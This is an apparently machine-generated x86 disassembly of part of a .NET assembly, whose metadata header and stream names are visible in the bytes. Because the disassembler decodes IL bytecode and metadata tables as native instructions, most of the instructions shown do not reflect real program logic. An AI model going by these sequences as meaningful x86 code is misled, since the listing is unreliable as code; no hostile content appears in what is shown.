100025bf:	00 0a                	add    %cl,(%edx)
100025c1:	2a 5e 03             	sub    0x3(%esi),%bl
100025c4:	7e 01                	jle    0x100025c7
100025c6:	00 00                	add    %al,(%eax)
100025c8:	04 03                	add    $0x3,%al
100025ca:	6f                   	outsl  %ds:(%esi),(%dx)
100025cb:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025d0:	27                   	daa
100025d1:	00 00                	add    %al,(%eax)
100025d3:	0a 6f 2e             	or     0x2e(%edi),%ch
100025d6:	00 00                	add    %al,(%eax)
100025d8:	0a 2a                	or     (%edx),%ch
100025da:	5e                   	pop    %esi
100025db:	03 7e 01             	add    0x1(%esi),%edi
100025de:	00 00                	add    %al,(%eax)
100025e0:	04 03                	add    $0x3,%al
100025e2:	6f                   	outsl  %ds:(%esi),(%dx)
100025e3:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025e8:	27                   	daa
100025e9:	00 00                	add    %al,(%eax)
100025eb:	0a 6f 2e             	or     0x2e(%edi),%ch
100025ee:	00 00                	add    %al,(%eax)
100025f0:	0a 2a                	or     (%edx),%ch
100025f2:	1e                   	push   %ds
100025f3:	02 28                	add    (%eax),%ch
100025f5:	2c 00                	sub    $0x0,%al
100025f7:	00 0a                	add    %cl,(%edx)
100025f9:	2a 4a 02             	sub    0x2(%edx),%cl
100025fc:	7b 1b                	jnp    0x10002619
100025fe:	00 00                	add    %al,(%eax)
10002600:	04 03                	add    $0x3,%al
10002602:	28 2f                	sub    %ch,(%edi)
10002604:	00 00                	add    %al,(%eax)
10002606:	0a 6f 30             	or     0x30(%edi),%ch
10002609:	00 00                	add    %al,(%eax)
1000260b:	0a 2a                	or     (%edx),%ch
1000260d:	00 00                	add    %al,(%eax)
1000260f:	00 42 53             	add    %al,0x53(%edx)
10002612:	4a                   	dec    %edx
10002613:	42                   	inc    %edx
10002614:	01 00                	add    %eax,(%eax)
10002616:	01 00                	add    %eax,(%eax)
10002618:	00 00                	add    %al,(%eax)
1000261a:	00 00                	add    %al,(%eax)
1000261c:	0c 00                	or     $0x0,%al
1000261e:	00 00                	add    %al,(%eax)
10002620:	76 34                	jbe    0x10002656
10002622:	2e 30 2e             	xor    %ch,%cs:(%esi)
10002625:	33 30                	xor    (%eax),%esi
10002627:	33 31                	xor    (%ecx),%esi
10002629:	39 00                	cmp    %eax,(%eax)
1000262b:	00 00                	add    %al,(%eax)
1000262d:	00 05 00 6c 00 00    	add    %al,0x6c00
10002633:	00 50 06             	add    %dl,0x6(%eax)
10002636:	00 00                	add    %al,(%eax)
10002638:	23 7e 00             	and    0x0(%esi),%edi
1000263b:	00 bc 06 00 00 ec 09 	add    %bh,0x9ec0000(%esi,%eax,1)
10002642:	00 00                	add    %al,(%eax)
10002644:	23 53 74             	and    0x74(%ebx),%edx
10002647:	72 69                	jb     0x100026b2
10002649:	6e                   	outsb  %ds:(%esi),(%dx)
1000264a:	67 73 00             	addr16 jae 0x1000264d
1000264d:	00 00                	add    %al,(%eax)
1000264f:	00 a8 10 00 00 3c    	add    %ch,0x3c000010(%eax)
10002655:	17                   	pop    %ss
10002656:	00 00                	add    %al,(%eax)
10002658:	23 55 53             	and    0x53(%ebp),%edx
1000265b:	00 e4                	add    %ah,%ah
1000265d:	27                   	daa
1000265e:	00 00                	add    %al,(%eax)
10002660:	10 00                	adc    %al,(%eax)
10002662:	00 00                	add    %al,(%eax)
10002664:	23 47 55             	and    0x55(%edi),%eax
10002667:	49                   	dec    %ecx
10002668:	44                   	inc    %esp
10002669:	00 00                	add    %al,(%eax)
1000266b:	00 f4                	add    %dh,%ah
1000266d:	27                   	daa
1000266e:	00 00                	add    %al,(%eax)
10002670:	9c                   	pushf
10002671:	02 00                	add    (%eax),%al
10002673:	00 23                	add    %ah,(%ebx)
10002675:	42                   	inc    %edx
10002676:	6c                   	insb   (%dx),%es:(%edi)
10002677:	6f                   	outsl  %ds:(%esi),(%dx)
10002678:	62 00                	bound  %eax,(%eax)
1000267a:	00 00                	add    %al,(%eax)
1000267c:	00 00                	add    %al,(%eax)
1000267e:	00 00                	add    %al,(%eax)
10002680:	02 00                	add    (%eax),%al
10002682:	00 01                	add    %al,(%ecx)
10002684:	57                   	push   %edi
10002685:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
1000268a:	00 00                	add    %al,(%eax)
1000268c:	00 fa                	add    %bh,%dl
1000268e:	01 33                	add    %esi,(%ebx)
10002690:	00 16                	add    %dl,(%esi)
10002692:	00 00                	add    %al,(%eax)
10002694:	01 00                	add    %eax,(%eax)
10002696:	00 00                	add    %al,(%eax)
10002698:	24 00                	and    $0x0,%al
1000269a:	00 00                	add    %al,(%eax)
1000269c:	06                   	push   %es
1000269d:	00 00                	add    %al,(%eax)
1000269f:	00 1b                	add    %bl,(%ebx)
100026a1:	00 00                	add    %al,(%eax)
100026a3:	00 12                	add    %dl,(%edx)
100026a5:	00 00                	add    %al,(%eax)
100026a7:	00 25 00 00 00 30    	add    %ah,0x30000000
100026ad:	00 00                	add    %al,(%eax)
100026af:	00 12                	add    %dl,(%edx)
100026b1:	00 00                	add    %al,(%eax)
100026b3:	00 03                	add    %al,(%ebx)
100026b5:	00 00                	add    %al,(%eax)
100026b7:	00 01                	add    %al,(%ecx)
100026b9:	00 00                	add    %al,(%eax)
100026bb:	00 03                	add    %al,(%ebx)
100026bd:	00 00                	add    %al,(%eax)
100026bf:	00 06                	add    %al,(%esi)
100026c1:	00 00                	add    %al,(%eax)
100026c3:	00 01                	add    %al,(%ecx)
100026c5:	00 00                	add    %al,(%eax)
100026c7:	00 03                	add    %al,(%ebx)
100026c9:	00 00                	add    %al,(%eax)
100026cb:	00 04 00             	add    %al,(%eax,%eax,1)
100026ce:	00 00                	add    %al,(%eax)
100026d0:	06                   	push   %es
100026d1:	00 00                	add    %al,(%eax)
100026d3:	00 00                	add    %al,(%eax)
100026d5:	00 21                	add    %ah,(%ecx)
100026d7:	07                   	pop    %es
100026d8:	01 00                	add    %eax,(%eax)
100026da:	00 00                	add    %al,(%eax)
100026dc:	00 00                	add    %al,(%eax)
100026de:	06                   	push   %es
100026df:	00 7f 05             	add    %bh,0x5(%edi)
100026e2:	bf 08 06 00 ec       	mov    $0xec000608,%edi
100026e7:	05 bf 08 06 00       	add    $0x608bf,%eax
100026ec:	b3 04                	mov    $0x4,%bl
100026ee:	8d 08                	lea    (%eax),%ecx
100026f0:	0f 00 df             	ltr    %edi
100026f3:	08 00                	or     %al,(%eax)
100026f5:	00 06                	add    %al,(%esi)
100026f7:	00 db                	add    %bl,%bl
100026f9:	04 dd                	add    $0xdd,%al
100026fb:	07                   	pop    %es
100026fc:	06                   	push   %es
100026fd:	00 62 05             	add    %ah,0x5(%edx)
10002700:	dd 07                	fldl   (%edi)
10002702:	06                   	push   %es
10002703:	00 43 05             	add    %al,0x5(%ebx)
10002706:	dd 07                	fldl   (%edi)
10002708:	06                   	push   %es
10002709:	00 d3                	add    %dl,%bl
1000270b:	05 dd 07 06 00       	add    $0x607dd,%eax
10002710:	9f                   	lahf
10002711:	05 dd 07 06 00       	add    $0x607dd,%eax
10002716:	b8 05 dd 07 06       	mov    $0x607dd05,%eax
1000271b:	00 f2                	add    %dh,%dl
1000271d:	04 dd                	add    $0xdd,%al
1000271f:	07                   	pop    %es
10002720:	06                   	push   %es
10002721:	00 c7                	add    %al,%bh
10002723:	04 a0                	add    $0xa0,%al
10002725:	08 06                	or     %al,(%esi)
10002727:	00 a5 04 a0 08 06    	add    %ah,0x608a004(%ebp)
1000272d:	00 26                	add    %ah,(%esi)
1000272f:	05 dd 07 06 00       	add    $0x607dd,%eax
10002734:	0d 05 5f 06 06       	or     $0x6065f05,%eax
10002739:	00 26                	add    %ah,(%esi)
1000273b:	09 53 07             	or     %edx,0x7(%ebx)
1000273e:	06                   	push   %es
1000273f:	00 5a 07             	add    %bl,0x7(%edx)
10002742:	53                   	push   %ebx
10002743:	07                   	pop    %es
10002744:	0a 00                	or     (%eax),%al
10002746:	10 09                	adc    %cl,(%ecx)
10002748:	8d 08                	lea    (%eax),%ecx
1000274a:	06                   	push   %es
1000274b:	00 fc                	add    %bh,%ah
1000274d:	07                   	pop    %es
1000274e:	53                   	push   %ebx
1000274f:	07                   	pop    %es
10002750:	06                   	push   %es
10002751:	00 8a 04 bf 08 06    	add    %cl,0x608bf04(%edx)
10002757:	00 6e 04             	add    %ch,0x4(%esi)
1000275a:	53                   	push   %ebx
1000275b:	07                   	pop    %es
1000275c:	06                   	push   %es
1000275d:	00 2b                	add    %ch,(%ebx)
1000275f:	01 53 07             	add    %edx,0x7(%ebx)
10002762:	06                   	push   %es
10002763:	00 dc                	add    %bl,%ah
10002765:	00 a5 03 06 00 56    	add    %ah,0x56000603(%ebp)
1000276b:	06                   	push   %es
1000276c:	41                   	inc    %ecx
1000276d:	09 06                	or     %eax,(%esi)
1000276f:	00 34 09             	add    %dh,(%ecx,%ecx,1)
10002772:	53                   	push   %ebx
10002773:	07                   	pop    %es
10002774:	06                   	push   %es
10002775:	00 8d 06 53 07 0e    	add    %cl,0xe075306(%ebp)
1000277b:	00 45 04             	add    %al,0x4(%ebp)
1000277e:	58                   	pop    %eax
1000277f:	08 06                	or     %al,(%esi)
10002781:	00 ce                	add    %cl,%dh
10002783:	00 a5 03 06 00 0c    	add    %ah,0xc000603(%ebp)
10002789:	07                   	pop    %es
1000278a:	a0 08 06 00 71       	mov    0x71000608,%al
1000278f:	08 53 07             	or     %dl,0x7(%ebx)
10002792:	06                   	push   %es
10002793:	00 0f                	add    %cl,(%edi)
10002795:	04 45                	add    $0x45,%al
10002797:	06                   	push   %es
10002798:	06                   	push   %es
10002799:	00 d6                	add    %dl,%dh
1000279b:	09 e4                	or     %esp,%esp
1000279d:	02 06                	add    (%esi),%al
1000279f:	00 ef                	add    %ch,%bh
100027a1:	07                   	pop    %es
100027a2:	e4 02                	in     $0x2,%al
100027a4:	06                   	push   %es
100027a5:	00 ba 06 e4 02 06    	add    %bh,0x602e406(%edx)
100027ab:	00 2e                	add    %ch,(%esi)
100027ad:	08 e4                	or     %ah,%ah
100027af:	02 06                	add    (%esi),%al
100027b1:	00 5c 04 e4          	add    %bl,-0x1c(%esp,%eax,1)
100027b5:	02 00                	add    (%eax),%al
100027b7:	00 00                	add    %al,(%eax)
100027b9:	00 78 01             	add    %bh,0x1(%eax)
100027bc:	00 00                	add    %al,(%eax)
100027be:	00 00                	add    %al,(%eax)
100027c0:	01 00                	add    %eax,(%eax)
100027c2:	01 00                	add    %eax,(%eax)
100027c4:	81 01 10 00 11 06    	addl   $0x6110010,(%ecx)
100027ca:	11 06                	adc    %eax,(%esi)
100027cc:	41                   	inc    %ecx
100027cd:	00 01                	add    %al,(%ecx)
100027cf:	00 01                	add    %al,(%ecx)
100027d1:	00 0b                	add    %cl,(%ebx)
100027d3:	01 10                	add    %edx,(%eax)
100027d5:	00 d8                	add    %bl,%al
100027d7:	02 00                	add    (%eax),%al
100027d9:	00 55 00             	add    %dl,0x0(%ebp)
100027dc:	02 00                	add    (%eax),%al
100027de:	0d 00 0b 01 10       	or     $0x10010b00,%eax
100027e3:	00 c4                	add    %al,%ah
100027e5:	02 00                	add    (%eax),%al
100027e7:	00 55 00             	add    %dl,0x0(%ebp)
100027ea:	14 00                	adc    $0x0,%al
100027ec:	0d 00 03 21 10       	or     $0x10210300,%eax
100027f1:	00 8d 03 00 00 41    	add    %cl,0x41000003(%ebp)
100027f7:	00 18                	add    %bl,(%eax)
100027f9:	00 0d 00 03 01 10    	add    %cl,0x10010300
100027ff:	00 28                	add    %ch,(%eax)
10002801:	00 00                	add    %al,(%eax)
10002803:	00 41 00             	add    %al,0x0(%ecx)
10002806:	1b 00                	sbb    (%eax),%eax
10002808:	11 00                	adc    %eax,(%eax)
1000280a:	11 00                	adc    %eax,(%eax)
1000280c:	cf                   	iret
1000280d:	03 31                	add    (%ecx),%esi
1000280f:	01 06                	add    %eax,(%esi)
10002811:	00 81 03 35 01 06    	add    %al,0x6013503(%ecx)
10002817:	00 61 07             	add    %ah,0x7(%ecx)
1000281a:	38 01                	cmp    %al,(%ecx)
1000281c:	06                   	push   %es
1000281d:	00 ff                	add    %bh,%bh
1000281f:	02 38                	add    (%eax),%bh
10002821:	01 06                	add    %eax,(%esi)
10002823:	00 2d 02 38 01 06    	add    %ch,0x6013802
10002829:	00 51 03             	add    %dl,0x3(%ecx)
1000282c:	3b 01                	cmp    (%ecx),%eax
1000282e:	06                   	push   %es
1000282f:	00 55 03             	add    %dl,0x3(%ebp)
10002832:	3b 01                	cmp    (%ecx),%eax
10002834:	06                   	push   %es
10002835:	00 78 08             	add    %bh,0x8(%eax)
10002838:	3b 01                	cmp    (%ecx),%eax
1000283a:	06                   	push   %es
1000283b:	00 90 07 3b 01 06    	add    %dl,0x6013b07(%eax)
10002841:	00 7b 07             	add    %bh,0x7(%ebx)
10002844:	3b 01                	cmp    (%ecx),%eax
10002846:	06                   	push   %es
10002847:	00 ee                	add    %ch,%dh
10002849:	01 3b                	add    %edi,(%ebx)
1000284b:	01 06                	add    %eax,(%esi)
1000284d:	00 9b 02 3b 01 06    	add    %bl,0x6013b02(%ebx)
10002853:	00 6b 02             	add    %ch,0x2(%ebx)
10002856:	3b 01                	cmp    (%ecx),%eax
10002858:	06                   	push   %es
10002859:	00 91 03 3e 01 06    	add    %dl,0x6013e03(%ecx)
1000285f:	00 64 01 3e          	add    %ah,0x3e(%ecx,%eax,1)
10002863:	01 06                	add    %eax,(%esi)
10002865:	00 ab 01 9c 00 06    	add    %ch,0x6009c01(%ebx)
1000286b:	00 d4                	add    %dl,%ah
1000286d:	01 9c 00 06 00 06 08 	add    %ebx,0x8060006(%eax,%eax,1)
10002874:	9c                   	pushf
10002875:	00 06                	add    %al,(%esi)
10002877:	00 47 08             	add    %al,0x8(%edi)
1000287a:	9c                   	pushf
1000287b:	00 06                	add    %al,(%esi)
1000287d:	00 20                	add    %ah,(%eax)
1000287f:	06                   	push   %es
10002880:	9c                   	pushf
10002881:	00 06                	add    %al,(%esi)
10002883:	00 a7 07 9c 00 06    	add    %ah,0x6009c07(%edi)
10002889:	00 ee                	add    %ch,%dh
1000288b:	02 35 01 06 00 39    	add    0x39000601,%dh
10002891:	07                   	pop    %es
10002892:	35 01 36 00 74       	xor    $0x74003601,%eax
10002897:	01 41 01             	add    %eax,0x1(%ecx)
1000289a:	16                   	push   %ss
1000289b:	00 01                	add    %al,(%ecx)
1000289d:	00 45 01             	add    %al,0x1(%ebp)
100028a0:	16                   	push   %ss
100028a1:	00 72 00             	add    %dh,0x0(%edx)
100028a4:	45                   	inc    %ebp
100028a5:	01 06                	add    %eax,(%esi)
100028a7:	00 81 01 4d 01 00    	add    %al,0x14d01(%ecx)
100028ad:	00 00                	add    %al,(%eax)
100028af:	00 80 00 91 20 0a    	add    %al,0xa209100(%eax)
100028b5:	09 54 01 01          	or     %edx,0x1(%ecx,%eax,1)
100028b9:	00 00                	add    %al,(%eax)
100028bb:	00 00                	add    %al,(%eax)
100028bd:	00 80 00 91 20 bd    	add    %al,-0x42df6f00(%eax)
100028c3:	09 66 01             	or     %esp,0x1(%esi)
100028c6:	0b 00                	or     (%eax),%eax
100028c8:	50                   	push   %eax
100028c9:	20 00                	and    %al,(%eax)
100028cb:	00 00                	add    %al,(%eax)
100028cd:	00 91 00 ca 06 71    	add    %dl,0x7106ca00(%ecx)
100028d3:	01 10                	add    %edx,(%eax)
100028d5:	00 00                	add    %al,(%eax)
100028d7:	00 00                	add    %al,(%eax)
100028d9:	00 80 00 91 20 f1    	add    %al,-0xedf6f00(%eax)
100028df:	03 76 01             	add    0x1(%esi),%esi
100028e2:	11 00                	adc    %eax,(%eax)
100028e4:	c4 20                	les    (%eax),%esp
100028e6:	00 00                	add    %al,(%eax)
100028e8:	00 00                	add    %al,(%eax)
100028ea:	96                   	xchg   %eax,%esi
100028eb:	00 81 02 7d 01 13    	add    %al,0x13017d02(%ecx)
100028f1:	00 00                	add    %al,(%eax)
100028f3:	00 00                	add    %al,(%eax)
100028f5:	00 80 00 91 20 50    	add    %al,0x50209100(%eax)
100028fb:	04 84                	add    $0x84,%al
100028fd:	01 15 00 0c 22 00    	add    %edx,0x220c00
10002903:	00 00                	add    %al,(%eax)
10002905:	00 91 00 30 06 71    	add    %dl,0x71063000(%ecx)
1000290b:	01 16                	add    %edx,(%esi)
1000290d:	00 00                	add    %al,(%eax)
1000290f:	00 00                	add    %al,(%eax)
10002911:	00 80 00 91 20 a1    	add    %al,-0x5edf6f00(%eax)
10002917:	09 89 01 17 00 00    	or     %ecx,0x1701(%ecx)
1000291d:	00 00                	add    %al,(%eax)
1000291f:	00 80 00 91 20 03    	add    %al,0x3209100(%eax)
10002925:	04 92                	add    $0x92,%al
10002927:	01 1c 00             	add    %ebx,(%eax,%eax,1)
1000292a:	7f 22                	jg     0x1000294e
1000292c:	00 00                	add    %al,(%eax)
1000292e:	00 00                	add    %al,(%eax)
10002930:	91                   	xchg   %eax,%ecx
10002931:	18 6a 08             	sbb    %ch,0x8(%edx)
10002934:	9e                   	sahf
10002935:	01 23                	add    %esp,(%ebx)
10002937:	00 8c 22 00 00 00 00 	add    %cl,0x0(%edx,%eiz,1)
1000293e:	93                   	xchg   %eax,%ebx
1000293f:	00 3d 00 a2 01 23    	add    %bh,0x2301a200
10002945:	00 fc                	add    %bh,%ah
10002947:	24 00                	and    $0x0,%al
10002949:	00 00                	add    %al,(%eax)
1000294b:	00 93 00 98 00 a2    	add    %dl,-0x5dff6800(%ebx)
10002951:	01 23                	add    %esp,(%ebx)
10002953:	00 ae 25 00 00 00    	add    %ch,0x25(%esi)
10002959:	00 91 18 6a 08 9e    	add    %dl,-0x61f795e8(%ecx)
1000295f:	01 23                	add    %esp,(%ebx)
10002961:	00 ba 25 00 00 00    	add    %bh,0x25(%edx)
10002967:	00 86 18 64 08 06    	add    %al,0x6086418(%esi)
1000296d:	00 23                	add    %ah,(%ebx)
1000296f:	00 c2                	add    %al,%dl
10002971:	25 00 00 00 00       	and    $0x0,%eax
10002976:	83 00 0a             	addl   $0xa,(%eax)
10002979:	00 a6 01 23 00 da    	add    %ah,-0x25ffdcff(%esi)
1000297f:	25 00 00 00 00       	and    $0x0,%eax
10002984:	83 00 7b             	addl   $0x7b,(%eax)
10002987:	00 a6 01 24 00 f2    	add    %ah,-0xdffdbff(%esi)
1000298d:	25 00 00 00 00       	and    $0x0,%eax
10002992:	86 18                	xchg   %bl,(%eax)
10002994:	64 08 06             	or     %al,%fs:(%esi)
10002997:	00 25 00 fa 25 00    	add    %ah,0x25fa00
1000299d:	00 00                	add    %al,(%eax)
1000299f:	00 83 00 0b 01 ab    	add    %al,-0x54fef500(%ebx)
100029a5:	01 25 00 00 00 01    	add    %esp,0x1000000
100029ab:	00 b2 02 00 00 02    	add    %dh,0x2000002(%edx)
100029b1:	00 e3                	add    %ah,%bl
100029b3:	00 00                	add    %al,(%eax)
100029b5:	00 03                	add    %al,(%ebx)
100029b7:	00 98 01 00 00 04    	add    %bl,0x4000001(%eax)
100029bd:	00 42 01             	add    %al,0x1(%edx)
100029c0:	00 00                	add    %al,(%eax)
100029c2:	05 00 16 02 00       	add    $0x21600,%eax
100029c7:	00 06                	add    %al,(%esi)
100029c9:	00 24 03             	add    %ah,(%ebx,%eax,1)
100029cc:	00 00                	add    %al,(%eax)
100029ce:	07                   	pop    %es
100029cf:	00 e0                	add    %ah,%al
100029d1:	06                   	push   %es
100029d2:	00 00                	add    %al,(%eax)
100029d4:	08 00                	or     %al,(%eax)
100029d6:	f5                   	cmc
100029d7:	06                   	push   %es
100029d8:	00 00                	add    %al,(%eax)
100029da:	09 00                	or     %eax,(%eax)
100029dc:	66 09 02             	or     %ax,(%edx)
100029df:	00 0a                	add    %cl,(%edx)
100029e1:	00 4d 09             	add    %cl,0x9(%ebp)
100029e4:	00 00                	add    %al,(%eax)
100029e6:	01 00                	add    %eax,(%eax)
100029e8:	20 06                	and    %al,(%esi)
100029ea:	00 00                	add    %al,(%eax)
100029ec:	02 00                	add    (%eax),%al
100029ee:	bc 01 00 00 03       	mov    $0x3000001,%esp
100029f3:	00 7e 09             	add    %bh,0x9(%esi)
100029f6:	00 00                	add    %al,(%eax)
100029f8:	04 00                	add    $0x0,%al
100029fa:	fc                   	cld
100029fb:	00 02                	add    %al,(%edx)
100029fd:	00 05 00 37 03 00    	add    %al,0x33700
10002a03:	00 01                	add    %al,(%ecx)
10002a05:	00 58 02             	add    %bl,0x2(%eax)
10002a08:	00 00                	add    %al,(%eax)
10002a0a:	01 00                	add    %eax,(%eax)
10002a0c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
10002a0d:	07                   	pop    %es
10002a0e:	02 00                	add    (%eax),%al
10002a10:	02 00                	add    (%eax),%al
10002a12:	15 08 00 00 01       	adc    $0x1000008,%eax
10002a17:	00 13                	add    %dl,(%ebx)
10002a19:	03 00                	add    (%eax),%eax
10002a1b:	00 02                	add    %al,(%edx)
10002a1d:	00 6e 03             	add    %ch,0x3(%esi)
10002a20:	00 00                	add    %al,(%eax)
10002a22:	01 00                	add    %eax,(%eax)
10002a24:	59                   	pop    %ecx
10002a25:	03 00                	add    (%eax),%eax
10002a27:	00 01                	add    %al,(%ecx)
10002a29:	00 58 02             	add    %bl,0x2(%eax)
10002a2c:	00 00                	add    %al,(%eax)
10002a2e:	01 00                	add    %eax,(%eax)
10002a30:	20 06                	and    %al,(%esi)
10002a32:	00 00                	add    %al,(%eax)
10002a34:	02 00                	add    (%eax),%al
10002a36:	90                   	nop
10002a37:	09 00                	or     %eax,(%eax)
10002a39:	00 03                	add    %al,(%ebx)
10002a3b:	00 00                	add    %al,(%eax)
10002a3d:	02 00                	add    (%eax),%al
10002a3f:	00 04 00             	add    %al,(%eax,%eax,1)
10002a42:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a43:	06                   	push   %es
10002a44:	00 00                	add    %al,(%eax)
10002a46:	05 00 94 06 00       	add    $0x69400,%eax
10002a4b:	00 01                	add    %al,(%ecx)
10002a4d:	00 20                	add    %ah,(%eax)
10002a4f:	06                   	push   %es
10002a50:	00 00                	add    %al,(%eax)
10002a52:	02 00                	add    (%eax),%al
10002a54:	42                   	inc    %edx
10002a55:	01 00                	add    %eax,(%eax)
10002a57:	00 03                	add    %al,(%ebx)
10002a59:	00 43 02             	add    %al,0x2(%ebx)
10002a5c:	00 00                	add    %al,(%eax)
10002a5e:	04 00                	add    $0x0,%al
10002a60:	e2 03                	loop   0x10002a65
10002a62:	00 00                	add    %al,(%eax)
10002a64:	05 00 32 01 00       	add    $0x13200,%eax
10002a69:	00 06                	add    %al,(%esi)
10002a6b:	00 24 03             	add    %ah,(%ebx,%eax,1)
10002a6e:	02 00                	add    (%eax),%al
10002a70:	07                   	pop    %es
10002a71:	00 28                	add    %ch,(%eax)
10002a73:	04 00                	add    $0x0,%al
10002a75:	00 01                	add    %al,(%ecx)
10002a77:	00 16                	add    %dl,(%esi)
10002a79:	09 00                	or     %eax,(%eax)
10002a7b:	00 01                	add    %al,(%ecx)
10002a7d:	00 16                	add    %dl,(%esi)
10002a7f:	09 00                	or     %eax,(%eax)
10002a81:	00 01                	add    %al,(%ecx)
10002a83:	00 61 04             	add    %ah,0x4(%ecx)
10002a86:	09 00                	or     %eax,(%eax)
10002a88:	64 08 01             	or     %al,%fs:(%ecx)
10002a8b:	00 11                	add    %dl,(%ecx)
10002a8d:	00 64 08 06          	add    %ah,0x6(%eax,%ecx,1)
10002a91:	00 19                	add    %bl,(%ecx)
10002a93:	00 64 08 0a          	add    %ah,0xa(%eax,%ecx,1)
10002a97:	00 29                	add    %ch,(%ecx)
10002a99:	00 64 08 10          	add    %ah,0x10(%eax,%ecx,1)
10002a9d:	00 31                	add    %dh,(%ecx)
10002a9f:	00 64 08 10          	add    %ah,0x10(%eax,%ecx,1)
10002aa3:	00 39                	add    %bh,(%ecx)
10002aa5:	00 64 08 10          	add    %ah,0x10(%eax,%ecx,1)
10002aa9:	00 41 00             	add    %al,0x0(%ecx)
10002aac:	64 08 10             	or     %dl,%fs:(%eax)
10002aaf:	00 49 00             	add    %cl,0x0(%ecx)
10002ab2:	64 08 10             	or     %dl,%fs:(%eax)
10002ab5:	00 51 00             	add    %dl,0x0(%ecx)
10002ab8:	64 08 10             	or     %dl,%fs:(%eax)
10002abb:	00 59 00             	add    %bl,0x0(%ecx)
10002abe:	64 08 10             	or     %dl,%fs:(%eax)
10002ac1:	00 61 00             	add    %ah,0x0(%ecx)
10002ac4:	64 08 15 00 69 00 64 	or     %dl,%fs:0x64006900
10002acb:	08 10                	or     %dl,(%eax)
10002acd:	00 71 00             	add    %dh,0x0(%ecx)
10002ad0:	64 08 10             	or     %dl,%fs:(%eax)
10002ad3:	00 79 00             	add    %bh,0x0(%ecx)
10002ad6:	64 08 10             	or     %dl,%fs:(%eax)
10002ad9:	00 a1 00 64 08 06    	add    %ah,0x6086400(%ecx)
10002adf:	00 c1                	add    %al,%cl
10002ae1:	00 5b 01             	add    %bl,0x1(%ebx)
10002ae4:	1a 00                	sbb    (%eax),%al
10002ae6:	c9                   	leave
10002ae7:	00 79 06             	add    %bh,0x6(%ecx)
10002aea:	1f                   	pop    %ds
10002aeb:	00 c1                	add    %al,%cl
10002aed:	00 8a 06 25 00 d1    	add    %cl,-0x2effdafa(%edx)
10002af3:	00 3d 04 2b 00 d9    	add    %bh,0xd9002b04
10002af9:	00 1f                	add    %bl,(%edi)
10002afb:	09 31                	or     %esi,(%ecx)
10002afd:	00 0c 00             	add    %cl,(%eax,%eax,1)
10002b00:	64 08 49 00          	or     %cl,%fs:0x0(%ecx)
10002b04:	d9 00                	flds   (%eax)
10002b06:	2d 09 4f 00 d9       	sub    $0xd9004f09,%eax
10002b0b:	00 b0 09 6c 00 d1    	add    %dh,-0x2eff93f7(%eax)
10002b11:	00 64 08 7d          	add    %ah,0x7d(%eax,%ecx,1)
10002b15:	00 e9                	add    %ch,%cl
10002b17:	00 0a                	add    %cl,(%edx)
10002b19:	06                   	push   %es
10002b1a:	90                   	nop
10002b1b:	00 f1                	add    %dh,%cl
10002b1d:	00 3c 08             	add    %bh,(%eax,%ecx,1)
10002b20:	9c                   	pushf
10002b21:	00 f1                	add    %dh,%cl
10002b23:	00 e0                	add    %ah,%al
10002b25:	09 9f 00 99 00 64    	or     %ebx,0x64009900(%edi)
10002b2b:	08 10                	or     %dl,(%eax)
10002b2d:	00 f9                	add    %bh,%cl
10002b2f:	00 41 08             	add    %al,0x8(%ecx)
10002b32:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10002b33:	00 91 00 c0 03 aa    	add    %dl,-0x55fc4000(%ecx)
10002b39:	00 91 00 1a 04 b0    	add    %dl,-0x4ffbe600(%ecx)
10002b3f:	00 91 00 34 07 06    	add    %dl,0x6073400(%ecx)
10002b45:	00 89 00 64 08 06    	add    %cl,0x6086400(%ecx)
10002b4b:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b4e:	64 08 06             	or     %al,%fs:(%esi)
10002b51:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b54:	16                   	push   %ss
10002b55:	04 c1                	add    $0xc1,%al
10002b57:	00 01                	add    %al,(%ecx)
10002b59:	01 ee                	add    %ebp,%esi
10002b5b:	08 c7                	or     %al,%bh
10002b5d:	00 1c 00             	add    %bl,(%eax,%eax,1)
10002b60:	64 08 49 00          	or     %cl,%fs:0x0(%ecx)
10002b64:	d9 00                	flds   (%eax)
10002b66:	78 04                	js     0x10002b6c
10002b68:	d8 00                	fadds  (%eax)
10002b6a:	89 00                	mov    %eax,(%eax)
10002b6c:	3c 09                	cmp    $0x9,%al
10002b6e:	ef                   	out    %eax,(%dx)
10002b6f:	00 11                	add    %dl,(%ecx)
10002b71:	01 66 04             	add    %esp,0x4(%esi)
10002b74:	f9                   	stc
10002b75:	00 01                	add    %al,(%ecx)
10002b77:	01 d0                	add    %edx,%eax
10002b79:	09 ff                	or     %edi,%edi
10002b7b:	00 d1                	add    %dl,%cl
10002b7d:	00 18                	add    %bl,(%eax)
10002b7f:	09 06                	or     %eax,(%esi)
10002b81:	01 21                	add    %esp,(%ecx)
10002b83:	01 b8 09 0d 01 81    	add    %edi,-0x7efef2f7(%eax)
10002b89:	00 64 08 06          	add    %ah,0x6(%eax,%ecx,1)
10002b8d:	00 d1                	add    %dl,%cl
10002b8f:	00 bf 06 14 01 d1    	add    %bh,-0x2efeebfa(%edi)
10002b95:	00 00                	add    %al,(%eax)
10002b97:	09 18                	or     %ebx,(%eax)
10002b99:	01 11                	add    %edx,(%ecx)
10002b9b:	01 c1                	add    %eax,%ecx
10002b9d:	07                   	pop    %es
10002b9e:	1d 01 14 00 f7       	sbb    $0xf7001401,%eax
10002ba3:	08 22                	or     %ah,(%edx)
10002ba5:	01 2e                	add    %ebp,(%esi)
10002ba7:	00 0b                	add    %cl,(%ebx)
10002ba9:	00 b0 01 2e 00 13    	add    %dh,0x13002e01(%eax)
10002baf:	00 b9 01 2e 00 1b    	add    %bh,0x1b002e01(%ecx)
10002bb5:	00 d8                	add    %bl,%al
10002bb7:	01 2e                	add    %ebp,(%esi)
10002bb9:	00 23                	add    %ah,(%ebx)
10002bbb:	00 e1                	add    %ah,%cl
10002bbd:	01 2e                	add    %ebp,(%esi)
10002bbf:	00 2b                	add    %ch,(%ebx)
10002bc1:	00 f5                	add    %dh,%ch
10002bc3:	01 2e                	add    %ebp,(%esi)
10002bc5:	00 33                	add    %dh,(%ebx)
10002bc7:	00 f5                	add    %dh,%ch
10002bc9:	01 2e                	add    %ebp,(%esi)
10002bcb:	00 3b                	add    %bh,(%ebx)
